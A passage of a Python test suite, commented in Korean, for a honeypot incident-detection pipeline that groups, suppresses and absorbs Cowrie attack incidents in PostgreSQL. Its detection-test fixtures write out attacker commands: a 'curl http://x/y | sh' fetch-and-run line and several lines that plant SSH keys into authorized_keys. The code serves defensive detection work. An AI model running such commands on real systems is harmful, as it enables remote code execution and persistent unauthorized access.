        ev = {k: json.loads(r[10]) for k, r in rows.items()}
        self.assertEqual(ev[self.K_FIRST]["absorbed"], {
            "window_hours": 24, "incidents": 1, "sources_total": 1, "sources": ["2.2.2.2"],
            "items": [{"key": self.K_DUP, "actor_ip": "2.2.2.2", "first_ts": at(60).isoformat(), "sessions": ["s2"]}]})
        self.assertEqual(ev[self.K_DUP]["duplicate_of"], self.K_FIRST)
        self.assertEqual(ev[self.K_FIRST]["sample"], [{"eventid": "cowrie.session.file_upload", "detail": "aaa"}])
        self.assertNotIn("_payload", rows[self.K_FIRST][10])
        # 흡수 기록 표가 있는지 먼저 본다
        self.assertIn(("SELECT to_regclass('incident_absorbed') IS NOT NULL", None), cur.log)
        # 억제 · 흡수를 한 잠금 문장으로 잡고, 잠근 것만 각자의 삭제 문장으로 지운다. 흡수 삭제는 지운 행을 기록 표에
        # 넣고, 가린 것이 흡수된 인시던트뿐인 억제(K_LOW)는 그 뒤에 첫 사건 아래 넣는다
        tail = [(sql, prm) for sql, prm in cur.log
                if sql in (detect.SUPPRESS_LOCK_SQL, detect.SUPPRESS_DELETE_SQL, detect.ABSORB_SQL, detect.ABSORB_VIA_SQL)]
        self.assertEqual([sql for sql, _ in tail], [detect.SUPPRESS_LOCK_SQL, detect.SUPPRESS_DELETE_SQL,
                                                    detect.ABSORB_SQL, detect.ABSORB_VIA_SQL])
        self.assertEqual(tail[0][1], [[self.K_LOW, self.K_DUP]])
        self.assertEqual(tail[1][1], [[self.K_LOW]])
        self.assertEqual(json.loads(tail[2][1][0]), [{"victim": self.K_DUP, "first_key": self.K_FIRST,
                                                      "sessions": ["s2"], "payloads": ["aaa"]}])
        self.assertEqual(json.loads(tail[3][1][0]), [{
            "member": self.K_LOW, "via": self.K_DUP, "rule_id": "X4", "rule_version": "x3", "actor_ip": "2.2.2.2",
            "first_ts": at(61).isoformat(), "last_ts": at(61).isoformat(), "signal_count": 1, "sessions": ["s9"]}])
        self.assertEqual([(s[0], s[6], s[7]) for s in summary], [("X3", 0, 1), ("X4", 1, 0)])
        text = out.getvalue()
        self.assertIn(f"{'억제':>6} {'흡수':>6} {'인시던트':>9}", text)
        self.assertIn("흡수 1건", text)
        self.assertIn("억제 가운데 1건은 가린 것이 흡수된 인시던트뿐이라", text)
        self.assertNotIn("흡수 대상", text)

    def test_흡수_칸은_실제로_지운_수다(self):
        # 판정 · 조치가 있어 지우지 못했으면 흡수 칸은 0 이고, 고른 수와의 차이를 따로 적는다
        cur = FakeCursor(self.answer([]))
        out = io.StringIO()
        with contextlib.redirect_stdout(out):
            summary = detect.run(FakeConn(cur), copy.deepcopy(self.DOC), None, None, verbose=True)
        self.assertEqual([(s[0], s[7]) for s in summary], [("X3", 0), ("X4", 0)])
        self.assertIn("흡수 대상 1건 중 1건은 판정 · 조치가 있거나 콘솔이 잡고 있어 남겼다", out.getvalue())

    def test_표가_없으면_멈춘다(self):
        with self.assertRaises(RuntimeError):
            run_quiet(self.DOC, db_answer(regclass=False))

    def test_구간_실행은_처음부터_읽고_구간에_닿은_것과_그_첫_사건만_넣는다(self):
        # A(0분) 가 P 의 닻, B(60분) 는 A 에 흡수. C(25시간) 는 새 닻, D 는 C 에 흡수. E(10분) 는 Q 의 닻
        day = 24 * 60
        sig = [(at(0), "1.1.1.1", "s1", "cowrie.session.file_upload", "P", "P"),
               (at(10), "5.5.5.5", "s5", "cowrie.session.file_upload", "Q", "Q"),
               (at(60), "2.2.2.2", "s2", "cowrie.session.file_upload", "P", "P"),
               (at(day + 60), "3.3.3.3", "s3", "cowrie.session.file_upload", "P", "P"),
               (at(day + 90), "4.4.4.4", "s4", "cowrie.session.file_upload", "P", "P")]
        doc = dict(copy.deepcopy(self.DOC), rules=[copy.deepcopy(self.DOC["rules"][0])])
        for since, loaded, pairs in ((at(30), ["A", "B", "C", "D"], [("B", "A"), ("D", "C")]),
                                     (at(day), ["C", "D"], [("D", "C")])):
            keys = {"A": 0, "B": 60, "C": day + 60, "D": day + 90}
            ip = {"A": "1.1.1.1", "B": "2.2.2.2", "C": "3.3.3.3", "D": "4.4.4.4"}
            key = {n: f"X3|x3|{ip[n]}|{at(m).isoformat()}" for n, m in keys.items()}

            def answer(sql, since=since):
                if sql == "SELECT %s::timestamptz":
                    return [(since,)]
                if "eventid LIKE" in sql:
                    return sig
                return db_answer()(sql)
            cur = FakeCursor(answer)
            with mock.patch.object(detect, "remove_incidents", return_value={}) as removed:
                detect.run(FakeConn(cur), copy.deepcopy(doc), since.isoformat(), None, verbose=False)
            with self.subTest(since=since):
                [(sql, prm)] = [(s, p) for s, p in cur.log if "eventid LIKE" in s]
                self.assertNotIn("ts >= %s", sql)                # 흡수 규칙은 처음부터 읽는다
                self.assertEqual([r[0] for _, rs in cur.batches for r in rs], [key[n] for n in loaded])
                absorbed = removed.call_args.args[2]
                self.assertEqual([(a["victim"], a["first_key"]) for a in absorbed], [(key[v], key[f]) for v, f in pairs])

    def test_remove_incidents(self):
        a1 = {"victim": "V1", "first_key": "F", "sessions": ["s1"], "payloads": ["p"]}
        a2 = {"victim": "V2", "first_key": "F", "sessions": [], "payloads": ["p"]}
        cur = FakeCursor(lambda sql: [("V2",)] if sql == detect.SUPPRESS_LOCK_SQL
                         else [("R003", 1)] if sql == detect.ABSORB_SQL else [])
        self.assertEqual(detect.remove_incidents(cur, [], [a1, a2]), {"R003": 1})
        self.assertEqual(cur.log, [(detect.SUPPRESS_LOCK_SQL, [["V1", "V2"]]),
                                   (detect.ABSORB_SQL, [json.dumps([a2], ensure_ascii=False)])])
        cur = FakeCursor()
        self.assertEqual(detect.remove_incidents(cur, [], []), {})
        self.assertEqual(cur.log, [])
        # 흡수가 없으면 옛 suppress 와 같은 두 문장
        cur = FakeCursor(lambda sql: [("L2",)] if sql == detect.SUPPRESS_LOCK_SQL else [])
        detect.remove_incidents(cur, ["L1", "L2"])
        self.assertEqual(cur.log, [(detect.SUPPRESS_LOCK_SQL, [["L1", "L2"]]),
                                   (detect.SUPPRESS_DELETE_SQL, [["L2"]])])

    def test_흡수_삭제는_지운_행을_같은_문장에서_기록한다(self):
        sql = detect.ABSORB_SQL
        self.assertIn("NOT EXISTS (SELECT 1 FROM verdicts v WHERE v.incident_key = i.incident_key)", sql)
        self.assertIn("NOT EXISTS (SELECT 1 FROM actions a WHERE a.incident_key = i.incident_key)", sql)
        self.assertIn("EXISTS (SELECT 1 FROM incidents f WHERE f.incident_key = d.first_key)", sql)
        self.assertIn("rec AS (INSERT INTO incident_absorbed", sql)
        self.assertIn("FROM gone ON CONFLICT (first_key, member_key) DO NOTHING", sql)
        self.assertNotIn("evidence", sql)          # 판정되면 굳는 첫 사건 근거에 기대지 않는다
        self.assertEqual(sql.count("%s"), 1)
        via = detect.ABSORB_VIA_SQL
        self.assertIn("JOIN incident_absorbed a ON a.member_key = x.via AND a.kind = 'absorbed'", via)
        self.assertIn("WHERE NOT EXISTS (SELECT 1 FROM incidents i WHERE i.incident_key = x.member)", via)

    def test_가린_것을_모두_돌려준다(self):
        rows = [SuppressTest.row("L", "R002", "high", 0, 10), SuppressTest.row("H1", "R003", "critical", 5, 5),
                SuppressTest.row("H2", "R006", "critical", 6, 6)]
        by = {}
        self.assertEqual(detect.plan_suppression(SuppressTest.CONF, SuppressTest.staged(*rows), by),
                         detect.plan_suppression(SuppressTest.CONF, SuppressTest.staged(*rows)))
        self.assertEqual(by, {"L": ["H1", "H2"]})


class OldVersionsUnchangedV3Test(unittest.TestCase):
    """흡수 · 새 유형이 들어와도 옵션이 없는 규칙 파일은 적재 행 · 문장 · 요약 표가 전과 같다."""

    OLD_HEADER = f"{'규칙':<6} {'이름':<18} {'신호':>8} {'통합':>8} {'억제':>6} {'인시던트':>9}  압축률   통합창"

    def test_옛_규칙에는_흡수가_없다(self):
        for name in ("rules.json", "rules_v2.json", "rules_self.json", "rules_node.json", "rules_w1.json",
                     "rules_audit.json", "rules_infra.json"):
            with self.subTest(rules=name):
                for rule in load(name)["rules"]:
                    self.assertIsNone(detect.absorb_conf(rule))
                    self.assertNotIn("baseline_days", rule["params"])
                    self.assertNotIn("exclude_pubkey_redir", rule["params"])

    def test_요약_표는_흡수_칸_없이_전과_같다(self):
        for name in ("rules.json", "rules_v2.json"):
            with self.subTest(rules=name):
                cur = FakeCursor(signal_answer)
                out = io.StringIO()
                with contextlib.redirect_stdout(out):
                    detect.run(FakeConn(cur), load(name), None, None, verbose=True)
                lines = out.getvalue().splitlines()
                self.assertEqual((lines[0], lines[3], lines[4]), ("=" * 82, self.OLD_HEADER, "-" * 82))
                self.assertNotIn("흡수", out.getvalue())
                self.assertFalse(any(sql in (detect.ABSORB_SQL, detect.ABSORB_VIA_SQL) or "incident_absorbed" in sql
                                     for sql, _ in cur.log))


@unittest.skipUnless(REAL_PG and os.environ.get("OPSLOOP_TEST_DATABASE_URL"), "PostgreSQL 시험 연결 미지정")
class V3DatabaseTest(unittest.TestCase):
    """v3 문장을 연결 전용 임시 테이블(search_path=pg_temp)에 실제로 돌린다. 운영 테이블은 건드리지 않는다."""

    def setUp(self):
        self.conn = psycopg2.connect(os.environ["OPSLOOP_TEST_DATABASE_URL"])
        self.cur = self.conn.cursor()
        self.cur.execute("SET search_path TO pg_temp")
        self.cur.execute("""
            CREATE TEMP TABLE events (ts timestamptz, sensor text, provenance text, eventid text, session text,
                                      src_ip inet, input text, url text, shasum text, message text);
            CREATE TEMP TABLE incidents (incident_key text PRIMARY KEY, rule_id text NOT NULL,
                rule_version text NOT NULL, rule_name text, severity text NOT NULL, actor_ip inet,
                first_ts timestamptz NOT NULL, last_ts timestamptz NOT NULL, signal_count integer NOT NULL,
                session_count integer, evidence jsonb, status text NOT NULL DEFAULT 'open',
                created_at timestamptz NOT NULL DEFAULT now(), target text);
            CREATE TEMP TABLE verdicts (id bigserial PRIMARY KEY, incident_key text NOT NULL
                REFERENCES incidents (incident_key) ON DELETE CASCADE, verdict text NOT NULL);
            CREATE TEMP TABLE actions (id bigserial PRIMARY KEY, incident_key text NOT NULL
                REFERENCES incidents (incident_key) ON DELETE CASCADE, action text NOT NULL);
        """)
        self.cur.execute(absorbed_table_sql(temp=True))

    def tearDown(self):
        self.conn.rollback()
        self.conn.close()

    def events(self, rows):
        self.cur.executemany("INSERT INTO events VALUES (%s, 'cowrie', 'real', %s, %s, %s, %s, %s, %s, %s)", rows)

    @staticmethod
    def redir(m, session, content):
        h = sha(content)
        return (at(m), "cowrie.session.file_download", session, "192.0.2.1", None, None, h,
                f"Saved redir contents with SHA-256 {h} to var/lib/cowrie/downloads/{h}")

    @staticmethod
    def cmd(m, session, text):
        return (at(m), "cowrie.command.input", session, "192.0.2.1", text, None, None, None)

    def test_R003_은_R006_이_잡는_세션의_공개키_줄_저장만_뺀다(self):
        upload = sha("ELF payload")
        self.events([
            self.cmd(0, "s1", f'cd ~ && echo "{ED_KEY} lab@test">>.ssh/authorized_keys'),
            self.redir(0, "s1", f"{ED_KEY} lab@test\n"),                  # 키 줄 (echo: 주석 · 줄바꿈)
            self.redir(0, "s1", "curl http://x/y | sh\n"),                # 같은 세션의 다른 리다이렉트 저장은 남는다
            self.redir(0, "s1", "\n"),                                    # 줄바꿈 1바이트
            self.cmd(1, "s2", f"printf '{RSA_KEY}' > /root/.ssh/authorized_keys"),
            self.redir(1, "s2", RSA_KEY),                                 # 키 줄 (printf: 주석 · 줄바꿈 없음)
            self.redir(2, "s3", f"{ED_KEY} lab@test\n"),                  # 같은 해시지만 그 세션에 키 명령이 없다
            (at(3), "cowrie.session.file_upload", "s4", "192.0.2.4", None, None, upload,
             f'SFTP Uploaded file "x" to var/lib/cowrie/downloads/{upload}'),
            (at(4), "cowrie.session.file_upload", "s4", "192.0.2.4", None, None, sha(""), "빈 파일"),
            # 키 줄을 /tmp 에 저장했다가 cp 로 옮겼다. R006 이 cp 를 잡으므로 뺀다
            self.cmd(5, "s5", f'echo "{ED_KEY}" > /tmp/.k'),
            self.redir(5, "s5", f"{ED_KEY}\n"),
            self.cmd(5, "s5", "cp /tmp/.k ~/.ssh/authorized_keys"),
            # R006 이 모르는 방법으로 옮겼다. R006 이 뜨지 않으므로 R003 에 남는다(두 규칙이 함께 놓치지 않는다)
            self.cmd(6, "s6", f'echo "{RSA_KEY}" > /tmp/.k'),
            self.redir(6, "s6", f"{RSA_KEY}\n"),
            self.cmd(6, "s6", "python3 -c \"import shutil; shutil.copy('/tmp/.k', '/root/.ssh/authorized_keys')\""),
        ])
        doc, rule = rule_of("rules_v3.json", "R003")
        rule = detect.prepare_rule(doc, copy.deepcopy(rule))
        got = sorted((s, d["_payload"][0]) for _, _, s, d in detect.signals_event_match(self.cur, rule, None, None))
        self.assertEqual(got, sorted([("s1", sha("curl http://x/y | sh\n")), ("s3", sha(f"{ED_KEY} lab@test\n")),
                                      ("s4", upload), ("s6", sha(f"{RSA_KEY}\n"))]))
        _, r6 = rule_of("rules_v3.json", "R006")
        planted = {s for _, _, s, _ in detect.signals_key_plant(self.cur, r6, None, None)}
        self.assertEqual(planted, {"s1", "s2", "s5"})          # 뺀 세션은 모두 R006 에 있다
        rule["params"]["exclude_pubkey_redir"] = False
        # 끄면 키 줄 네 건이 돌아온다(빈 파일 · 줄바꿈 1바이트는 해시 앞머리로 여전히 빠진다)
        self.assertEqual(len(detect.signals_event_match(self.cur, rule, None, None)), 7)

    def test_R006_쓰기_대상과_PG_파이썬_정규식이_같다(self):
        texts = [f'cd ~ && echo "{ED_KEY} mdrfckr">>.ssh/authorized_keys',
                 f"echo {RSA_KEY} | tee -a /root/.ssh/authorized_keys",
                 f'echo "{ED_KEY}" > /tmp/k; cat /tmp/k >> ~/.ssh/authorized_keys',
                 "cat ~/.ssh/authorized_keys", "chattr -ia .ssh/authorized_keys", f"echo {ED_KEY} x",
                 f'echo "{RSA_KEY}" >> "$HOME"/.ssh/authorized_keys',               # 따옴표로 끊긴 경로
                 f'echo "{ED_KEY}" > ~/".ssh/authorized_keys"',
                 "cp /tmp/.k ~/.ssh/authorized_keys && chmod 600 ~/.ssh/authorized_keys",   # 키 없는 쓰기
                 "dd if=/tmp/.k of=/root/.ssh/authorized_keys2",
                 'echo "" > ~/.ssh/authorized_keys',                                # 비우기(키 없음)
                 "grep ssh ~/.ssh/authorized_keys > /tmp/authorized_keys.bak",       # 다른 이름
                 "cp ~/.ssh/authorized_keys /tmp/backup",                            # 읽기
                 "mv /tmp/.k .ssh/authorized_keys"]
        self.events([self.cmd(i, f"k{i}", t) for i, t in enumerate(texts)])
        _, rule = rule_of("rules_v3.json", "R006")
        sig = sorted(detect.signals_key_plant(self.cur, rule, None, None), key=lambda s: s[0])
        self.assertEqual([(s, d["key_fps"]) for _, _, s, d in sig],
                         [("k0", [ED_FP]), ("k1", [RSA_FP]), ("k2", [ED_FP]), ("k6", [RSA_FP]), ("k7", [ED_FP]),
                          ("k8", []), ("k9", []), ("k10", []), ("k13", [])])
        for t in texts:
            self.cur.execute("SELECT m FROM regexp_matches(%s, %s, 'g') AS m", (t, detect.SSH_KEY_RE))
            self.assertEqual([tuple(r[0]) for r in self.cur.fetchall()],
                             [m.groups() for m in re.finditer(detect.SSH_KEY_RE, t)])

    def inc(self, key, minutes, ip="192.0.2.9", rule="R003"):
        self.cur.execute("INSERT INTO incidents (incident_key, rule_id, rule_version, severity, actor_ip, first_ts, "
                         "last_ts, signal_count, evidence) VALUES (%s, %s, 't3', 'critical', %s, %s, %s, 1, '{}')",
                         (key, rule, ip, at(minutes), at(minutes)))

    def records(self):
        self.cur.execute("SELECT first_key, member_key, kind, via_key, host(actor_ip), first_ts, sessions, payloads "
                         "FROM incident_absorbed ORDER BY 1, 2")
        return self.cur.fetchall()

    def keys(self):
        self.cur.execute("SELECT incident_key FROM incidents ORDER BY 1")
        return [k for k, in self.cur.fetchall()]

    @staticmethod
    def dup(victim, first, *sessions):
        return {"victim": victim, "first_key": first, "sessions": list(sessions), "payloads": ["p"]}

    def test_흡수_삭제와_기록(self):
        self.inc("F", 0)
        for key, m in (("V1", 30), ("V2", 90), ("V3", 40), ("V4", 50), ("V7", 20), ("V8", 25)):
            self.inc(key, m, f"192.0.2.{m}")
        self.cur.execute("INSERT INTO verdicts (incident_key, verdict) VALUES ('V3', 'threat')")
        self.cur.execute("INSERT INTO actions (incident_key, action) VALUES ('V4', 'block_ip')")
        got = detect.remove_incidents(self.cur, [], [self.dup("V1", "F", "s1"), self.dup("V2", "F"),
                                                     self.dup("V3", "F"), self.dup("V4", "F"), self.dup("V7", "없음")])
        # V1 · V2 는 지우고 같은 문장에서 기록한다(첫 사건 근거와 상관없다). V3 · V4 는 사람이 손댔고,
        # V7 은 첫 사건이 없고, V8 은 흡수 목록에 없다. 기록되지 않은 것은 지우지 않는다
        self.assertEqual(got, {"R003": 2})
        self.assertEqual(self.keys(), ["F", "V3", "V4", "V7", "V8"])
        self.assertEqual(self.records(), [("F", "V1", "absorbed", None, "192.0.2.30", at(30), ["s1"], ["p"]),
                                          ("F", "V2", "absorbed", None, "192.0.2.90", at(90), [], ["p"])])
        # 첫 사건이 판정돼 근거가 굳은 뒤에 온 중복도 지우고 기록한다
        self.cur.execute("INSERT INTO verdicts (incident_key, verdict) VALUES ('F', 'threat')")
        self.inc("V9", 120, "192.0.2.120")
        self.assertEqual(detect.remove_incidents(self.cur, [], [self.dup("V9", "F")]), {"R003": 1})
        # 다음 회차가 같은 키를 다시 넣고 지워도 기록은 하나다
        self.inc("V1", 30, "192.0.2.30")
        self.assertEqual(detect.remove_incidents(self.cur, [], [self.dup("V1", "F", "s1")]), {"R003": 1})
        self.assertEqual([r[1] for r in self.records()], ["V1", "V2", "V9"])
        self.assertEqual(self.keys(), ["F", "V3", "V4", "V7", "V8"])

    def test_흡수로만_가린_억제는_첫_사건_아래_남긴다(self):
        self.inc("F", 0)
        self.inc("V1", 30, "192.0.2.30")
        self.inc("V3", 40, "192.0.2.40")
        self.cur.execute("INSERT INTO verdicts (incident_key, verdict) VALUES ('V3', 'threat')")
        detect.remove_incidents(self.cur, [], [self.dup("V1", "F"), self.dup("V3", "F")])
        for key, ip in (("L1", "192.0.2.30"), ("L2", "192.0.2.40"), ("L3", "192.0.2.30")):
            self.inc(key, 29, ip, rule="R002")
        self.cur.execute("INSERT INTO actions (incident_key, action) VALUES ('L3', 'note')")

        def via(member, v, ip):
            return {"member": member, "via": v, "rule_id": "R002", "rule_version": "t3", "actor_ip": ip,
                    "first_ts": at(29).isoformat(), "last_ts": at(29).isoformat(), "signal_count": 1,
                    "sessions": [f"s-{member}"]}
        detect.remove_incidents(self.cur, ["L1", "L2", "L3"], [],
                                [via("L1", "V1", "192.0.2.30"), via("L2", "V3", "192.0.2.40"), via("L3", "V1", "192.0.2.30")])
        # L1 은 지워졌고 가린 V1 이 흡수로 기록돼 있어 F 아래 남는다. L2 는 가린 V3 가 남았으니 보통의 억제다.
        # L3 은 조치가 있어 지우지 않았다
        self.assertEqual(self.records(), [("F", "L1", "suppressed", "V1", "192.0.2.30", at(29), ["s-L1"], []),
                                          ("F", "V1", "absorbed", None, "192.0.2.30", at(30), [], ["p"])])
        self.assertEqual(self.keys(), ["F", "L3", "V3"])


class NoCommit:
    """run() 의 커밋을 막는 연결. 시험이 끝나면 되돌린다."""

    def __init__(self, conn):
        self.conn = conn

    def cursor(self):
        return self.conn.cursor()

    def commit(self):
        pass


@unittest.skipUnless(REAL_PG and os.environ.get("OPSLOOP_LAB_DATABASE_URL"), "실험 DB 연결 미지정")
class LabReplayTest(unittest.TestCase):
    """실험 DB(운영 덤프 + v2 전 기간 리플레이)의 실제 표에서 돌린다. 커밋하지 않고 끝에 되돌린다.

    sessions 는 다 적재된 값(로그인 성공 · 명령 수)으로 읽는다. 세션이 적재 도중일 때 R002 가 보는 값의 차이는
    모사하지 않는다.
    """

    ALL = ("R001", "R002", "R003", "R004", "R005", "R006")

    def setUp(self):
        self.conn = psycopg2.connect(os.environ["OPSLOOP_LAB_DATABASE_URL"])
        self.cur = self.conn.cursor()

    def tearDown(self):
        self.conn.rollback()
        self.conn.close()

    def need_v3(self):
        self.cur.execute("SELECT to_regclass('incident_absorbed') IS NOT NULL")
        if not self.cur.fetchone()[0]:
            self.skipTest("incident_absorbed 표가 없습니다 (infra/migrations/20260925_v3_absorbed.sql)")

    def wipe_v3(self):
        self.cur.execute("DELETE FROM verdicts WHERE incident_key IN "
                         "(SELECT incident_key FROM incidents WHERE rule_version = 'v3')")
        self.cur.execute("DELETE FROM incidents WHERE rule_version = 'v3'")
        self.cur.execute("DELETE FROM incident_absorbed WHERE rule_version = 'v3'")

    def rows(self, version):
        self.cur.execute("SELECT incident_key, last_ts, signal_count, session_count, evidence::text FROM incidents "
                         "WHERE rule_version = %s", (version,))
        return set(self.cur.fetchall())

    def absorbed(self):
        # 기록은 처음 지울 때의 값으로 남는다(넣기만 한다). 끝 시각 · 세션은 그 뒤 회차에서 자라지 않으므로 비교에서 뺀다
        self.cur.execute("SELECT first_key, member_key, kind, via_key, host(actor_ip), first_ts FROM incident_absorbed "
                         "WHERE rule_version = 'v3'")
        return set(self.cur.fetchall())

    def run_doc(self, name, until=None, since=None):
        # 이 파일은 적재를 가짜 execute_batch 로 바꿔 두었다. 여기서는 진짜로 넣는다. name 은 파일 이름이나 정의다
        doc = name if isinstance(name, dict) else load(name)
        with mock.patch.object(detect, "execute_batch", psycopg2.extras.execute_batch):
            return detect.run(NoCommit(self.conn), doc, since, until, verbose=False)

    @staticmethod
    def v3_sigma3():
        """R005 만 σ 3.0 으로 되돌린 v3. σ 별 칸 수를 비교할 때 쓴다."""
        doc = copy.deepcopy(load("rules_v3.json"))
        [r5] = [r for r in doc["rules"] if r["id"] == "R005"]
        r5["params"]["sigma"] = 3.0
        return doc

    def span(self):
        self.cur.execute("SELECT min(ts), max(ts) FROM events WHERE provenance = 'real'")
        return self.cur.fetchone()

    def test_v1_v2_재실행_행이_그대로(self):
        # 키만이 아니라 끝 시각 · 건수 · 세션 수 · 근거까지 행 전체를 본다
        for name in ("rules.json", "rules_v2.json"):
            with self.subTest(rules=name):
                version = load(name)["rule_version"]
                before = self.rows(version)
                self.assertTrue(before)
                self.run_doc(name)
                self.assertEqual(self.rows(version), before)

    def test_v3_리플레이가_규칙_파일_수치와_같고_흡수가_기록된다(self):
        self.need_v3()
        doc = load("rules_v3.json")
        replay = doc["derived_from"]["replay"]
        self.assertEqual(len(self.rows("v2")), replay["v2_incidents"])
        self.wipe_v3()
        summary = {s[0]: s for s in self.run_doc("rules_v3.json")}
        self.assertEqual(len(self.rows("v3")), replay["v3_incidents"])
        for rid in ("R003", "R006"):
            _, _, _, groups, left, _, n_sup, n_abs = summary[rid]
            self.cur.execute("SELECT count(*), count(DISTINCT member_key) FROM incident_absorbed "
                             "WHERE rule_version = 'v3' AND rule_id = %s AND kind = 'absorbed'", (rid,))
            recorded = self.cur.fetchone()
            self.cur.execute("SELECT coalesce(sum((evidence #>> '{absorbed,incidents}')::int), 0), "
                             "coalesce(max(jsonb_array_length(evidence #> '{absorbed,items}')), 0) "
                             "FROM incidents WHERE rule_version = 'v3' AND rule_id = %s", (rid,))
            in_evidence, most = self.cur.fetchone()
            with self.subTest(rule=rid):
                self.assertEqual(left + n_abs, groups)          # 흡수 칸은 실제로 지운 수다
                self.assertEqual(recorded, (n_abs, n_abs))      # 지운 것은 모두 기록 표에 있다
                self.assertEqual(in_evidence, n_abs)            # 판정이 없으니 첫 사건 근거에도 모두 있다
                self.assertLessEqual(most, 100)
        self.cur.execute("SELECT kind, count(*) FROM incident_absorbed WHERE rule_version = 'v3' GROUP BY 1")
        self.assertEqual(dict(self.cur.fetchall()), replay["incident_absorbed"])
        # 가린 것이 흡수된 인시던트뿐인 R002 는 첫 사건 아래 남는다. 1회차에서 위협으로 판정된 110.43.37.72 의
        # R002(9/4 22:41)는 같은 출발지 R003(22:44)에 가려졌고, 그 R003 은 4.4.66.84(16:50)에 흡수됐다
        self.cur.execute("SELECT first_key, via_key FROM incident_absorbed WHERE rule_version = 'v3' "
                         "AND kind = 'suppressed' AND host(actor_ip) = '110.43.37.72'")
        [(first, via)] = self.cur.fetchall()
        self.assertTrue(first.startswith("R003|v3|4.4.66.84|2026-09-04T16:50"))
        self.assertTrue(via.startswith("R003|v3|110.43.37.72|2026-09-04T22:44"))
        # 키 줄 리다이렉트(a8460f44…)와 줄바꿈 1바이트는 R003 에 없다
        self.cur.execute("SELECT count(*) FROM incidents WHERE rule_version = 'v3' AND rule_id = 'R003' "
                         "AND evidence::text ~ '(a8460f446be54041|01ba4719c80b6fe9)'")
        self.assertEqual(self.cur.fetchone()[0], 0)

    def test_v3_R005_는_σ_4_5_위_5칸만_low_로(self):
        # σ 3.0 의 10칸(z 3.18 ~ 6.90) 가운데 z 4.5 이상 5칸만 남는다. 나머지 규칙은 σ 와 상관없이 같다
        self.need_v3()
        self.wipe_v3()
        self.run_doc(self.v3_sigma3())
        low = self.rows("v3")
        self.wipe_v3()
        self.run_doc("rules_v3.json")
        high = self.rows("v3")
        self.assertEqual(sum(1 for r in low if r[0].startswith("R005|")), 10)
        self.assertEqual({r for r in low if not r[0].startswith("R005|")},
                         {r for r in high if not r[0].startswith("R005|")})
        self.cur.execute("SELECT split_part(incident_key, '|', 4), severity, (evidence ->> 'observed_sigma_max')::float "
                         "FROM incidents WHERE rule_version = 'v3' AND rule_id = 'R005' ORDER BY 3 DESC")
        self.assertEqual([(t[:13], sev, z) for t, sev, z in self.cur.fetchall()], [
            ("2026-09-11T19", "low", 6.9), ("2026-09-09T12", "low", 6.67), ("2026-09-14T02", "low", 6.07),
            ("2026-09-21T16", "low", 6.06), ("2026-09-20T15", "low", 4.52)])

    def test_w2_는_메타데이터_오탐만_사라진다(self):
        self.cur.execute("DELETE FROM verdicts WHERE incident_key IN "
                         "(SELECT incident_key FROM incidents WHERE rule_version IN ('w1', 'w2'))")
        self.cur.execute("DELETE FROM incidents WHERE rule_version IN ('w1', 'w2')")
        w1, _ = w1_r102()
        self.run_doc(w1)
        before = self.rows("w1")
        self.run_doc("rules_w1.json")
        after = self.rows("w2")
        # 실험 DB 의 w1 은 R102 159.223.46.221(9/22 19:53) 하나이고 R101 · R103 · R104 는 없다. w2 는 그 하나만 없다
        self.assertEqual({r[0] for r in before}, {"R102|w1|159.223.46.221|2026-09-22T19:53:21.332543+00:00"})
        norm = {r[0].replace("|w1|", "|w2|", 1) for r in before if "|159.223.46.221|" not in r[0]}
        self.assertEqual({r[0] for r in after}, norm)

    def test_v3_증분과_리플레이가_같다(self):
        self.need_v3()
        doc = load("rules_v3.json")
        self.wipe_v3()
        self.run_doc(doc)
        replay, records = self.rows("v3"), self.absorbed()
        self.assertTrue(any(r[0].startswith("R005|") for r in replay))
        self.wipe_v3()
        t, end = self.span()
        t = t.replace(minute=0, second=0, microsecond=0)
        while t <= end:
            self.run_doc(doc, t.isoformat())
            t += timedelta(hours=6)
        self.run_doc(doc)
        self.assertEqual(self.rows("v3"), replay)
        self.assertEqual(self.absorbed(), records)

    def test_v3_하루_구간_실행과_리플레이가_같다(self):
        # --since D --until D+1 을 하루씩 이어 돌린 누적. 흡수는 신호를 처음부터 읽어 닻을 정하고, R005 는 앞 구간이
        # 지운 인시던트의 출발지도 빼며 앞 구간이 보지 못한 끝 칸을 본다
        self.need_v3()
        doc = load("rules_v3.json")
        self.wipe_v3()
        self.run_doc(doc)
        replay, records = self.rows("v3"), self.absorbed()
        self.assertTrue(any(r[0].startswith("R005|") for r in replay))
        self.wipe_v3()
        t, end = self.span()
        t, cuts = t.replace(hour=0, minute=0, second=0, microsecond=0), []
        while t <= end:
            self.run_doc(doc, (t + timedelta(days=1)).isoformat(), since=t.isoformat())
            t += timedelta(days=1)
            cuts.append(t)
        got = self.rows("v3")
        self.assertEqual(self.absorbed(), records)

        def pick(rows, rids):
            return {r for r in rows if r[0].split("|")[0] in rids}
        exact = ("R003", "R005", "R006")
        self.assertEqual(pick(got, exact), pick(replay, exact))
        # 나머지 규칙은 구간 경계에 걸친 묶음만 다르다. 구간 실행은 since 앞 신호를 읽지 않아 그런 묶음을 경계에서
        # 둘로 가른다(모든 규칙 · 버전에 공통인 구간 실행의 성질이고 흡수 · R005 와 상관없다)
        rest = tuple(r for r in self.ALL if r not in exact)
        first = {r[0]: datetime.fromisoformat(r[0].rsplit("|", 1)[1]) for r in replay | got}
        spanning = [r for r in pick(replay, rest) if any(first[r[0]] < c <= r[1] for c in cuts)]
        for r in pick(replay, rest) - pick(got, rest):
            self.assertIn(r, spanning)
        for r in pick(got, rest) - pick(replay, rest):
            rid, _, who, _ = r[0].split("|")
            self.assertTrue(any(s[0].split("|")[0] == rid and s[0].split("|")[2] == who
                                and first[s[0]] <= first[r[0]] <= s[1] for s in spanning), r[0])

    def test_v3_첫_사건을_판정해도_중복은_흡수된다(self):
        # 6시간마다 돌리며 뜬 지 1시간이 지난 첫 사건(R003 · R006)을 판정한다. 판정된 첫 사건의 근거는 굳지만
        # 그 뒤의 중복도 지워지고 기록 표에 붙어, 결과가 판정 없는 리플레이와 같다
        self.need_v3()
        self.wipe_v3()
        self.run_doc("rules_v3.json")
        replay = {r[0] for r in self.rows("v3")}
        self.cur.execute("SELECT first_key, member_key, kind FROM incident_absorbed WHERE rule_version = 'v3'")
        records = set(self.cur.fetchall())
        self.wipe_v3()
        t, end = self.span()
        t, judged = t.replace(minute=0, second=0, microsecond=0), 0
        while t <= end + timedelta(hours=6):
            self.run_doc("rules_v3.json", t.isoformat())
            self.cur.execute("INSERT INTO verdicts (incident_key, verdict, reason, operator) "
                             "SELECT incident_key, 'threat', '시험', 'lab' FROM incidents i WHERE rule_version = 'v3' "
